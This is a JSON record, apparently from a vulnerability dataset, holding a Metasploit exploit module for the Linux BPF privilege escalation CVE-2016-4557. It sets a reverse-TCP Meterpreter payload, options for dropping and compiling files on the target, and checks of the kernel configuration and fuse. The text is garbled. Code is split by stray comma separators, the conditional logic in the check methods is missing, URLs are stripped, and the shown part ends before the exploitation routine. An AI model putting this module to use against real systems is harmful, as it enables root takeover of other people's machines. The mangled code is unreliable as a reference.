{
    "text": "vul_name : Linux BPF Local Privilege Escalation Exploit ， vul_cve : CVE-2016-4557 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， require 'msf/core' ， class MetasploitModule < Msf : Exploit : Local ， Rank = GoodRanking ， include Msf : Exploit : EXE ， include Msf : Post : File ， include Msf : Exploit : FileDropper ， super ( update_info ( info , { ， 'Name' => 'Linux BPF Local Privilege Escalation' ,  ， 'Description' => %q{ ， Linux kernel >= 4.4 with CONFIG_BPF_SYSCALL and kernel.unprivileged_bpf_disabled ， sysctl is not set to 1 , BPF can be abused to priv escalate. ， Ubuntu 16.04 has all of these conditions met. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'jannh @ google.com' ,  # discovery ， 'h00die <mike @ shorebreaksecurity.com>' # metasploit module ，  ]  ,  ， 'Platform' => [ 'linux' ]  ,  ， 'Arch' => [ ARCH_X86 , ARCH_X86_64 ]  ,  ， 'SessionTypes' => [ 'shell' , 'meterpreter' ]  ,  ， ' ，  [  ，  [ 'CVE' , '2016-4557' ]  ,  ，  [ 'EDB' , '39772' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'Targets' => ，  [  ，  [ 'Linux x86' , { 'Arch' => ARCH_X86 } ]  ,  ，  [ 'Linux x64' , { 'Arch' => ARCH_X86_64 } ]  ，  ]  ,  ， 'DefaultOptions' => ， { ， 'payload' => 'linux/x64/mettle/reverse_tcp' ,  ， 'PrependFork' => true ,  ， 'WfsDelay' => 60 # we can chew up a lot of CPU for this , so we want to give time for payload to come through ， } ,  ， 'DefaultTarget' => 1 ,  ， 'DisclosureDate' => 'May 04 2016' ,  ， 'Privileged' => true ， } ， register_options (  [  ， OptString.new ( 'WritableDir' ,  [ true , 'A directory where we can write files' , '/tmp' ]  )  ,  ， OptEnum.new ( 'COMPILE' ,  [ true , 'Compile on target' , 'Auto' ,  [ 'Auto' , 'True' , 'False' ]  )  ,  ， OptInt.new ( 'MAXWAIT' ,  [ true , 'Max seconds to wait for decrementation in seconds' , 120 ]  )  ，  ]  , self.class )  ， end ， def check ， def check_config_bpf_syscall? (  )  ， output = cmd_exec ( 'grep CONFIG_BPF_SYSCALL /boot/config-`uname -r`' )  ， vprint_good ( 'CONFIG_BPF_SYSCALL is set to yes' )  ， print_error ( 'CONFIG_BPF_SYSCALL is NOT set to yes' )  ， end ， end ， def check_kernel_disabled? (  )  ， output = cmd_exec ( 'sysctl kernel.unprivileged_bpf_disabled' )  ， vprint_good ( 'kernel.unprivileged_bpf_disabled is NOT set to 1' )  ， print_error ( 'kernel.unprivileged_bpf_disabled is set to 1' )  ， end ， end ， def check_fuse? (  )  ， lib = cmd_exec ( 'dpkg -get-selections | grep ^fuse' )  ， vprint_good ( 'fuse is installed' )  ， print_error ( 'fuse is not installed. Exploitation will fail.' )  ， end ， end ， def mount_point_exists? (  )  ， print_error ( '/tmp/fuse_mount should be unmounted and deleted. Exploitation will fail.' )  ， vprint_good ( '/tmp/fuse_mount doesn\\'t exist' )  ， end ， end",
    "time": "2016.11.15"
}